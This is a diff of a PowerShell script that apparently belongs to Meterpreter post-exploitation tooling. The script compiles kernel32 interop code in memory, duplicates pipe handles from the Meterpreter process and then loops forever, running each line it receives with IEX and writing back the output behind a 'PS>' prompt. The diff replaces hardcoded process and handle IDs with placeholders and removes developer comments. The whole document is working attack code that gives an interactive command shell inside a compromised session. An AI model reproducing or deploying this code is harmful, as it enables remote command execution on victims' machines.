@@ -16,21 +16,12 @@ $b.GenerateInMemory = $True
 $d = $c.CompileAssemblyFromSource($b, $a)
 
 # Replace Process ID with Meterpreter Proc Id
-$parentProcessID = 7596
-$remote_handle_in = 780
-$remote_handle_out = 764
+$parentProcessID = METERP_PID
+$remote_handle_in = REM_HANDLE_IN
+$remote_handle_out = REM_HANDLEOUT
 
 $sourceHandle = [kernel32.func]::OpenProcess(64,1,$parentProcessID);
 $cHandle = [kernel32.func]::GetCurrentProcess();
-
-
-# Replace remote_handle witth in[0] value from process .c
-# packet_add_tlv_uint(response, TLV_TYPE_HANDLE, (DWORD)in[0]);
-# Dont close the Handle... (Line 543) process .c
-# extensions/stdapi/sys/process.rb
-# Line 170
-# in_handle = response.get_tlv_value(TLV_TYPE_HANDLE)
-# puts in_handle.inspect < use this
 
 $handle_in = -1
 $res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_in, $cHandle, [ref] $handle_in, 2, 1, 2)
@@ -44,10 +35,12 @@ $out_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_out,
 $fso = New-Object IO.FileStream $out_handle, ReadWrite
 $sw = New-Object IO.StreamWriter $fso
 $sw.AutoFlush=1
+$sw.Write("PS>")
 
 while (1) {
 	$o = IEX ($sr.ReadLine())
 	$sw.WriteLine($o)
 	$sw.Write("PS>")
 }
+
 
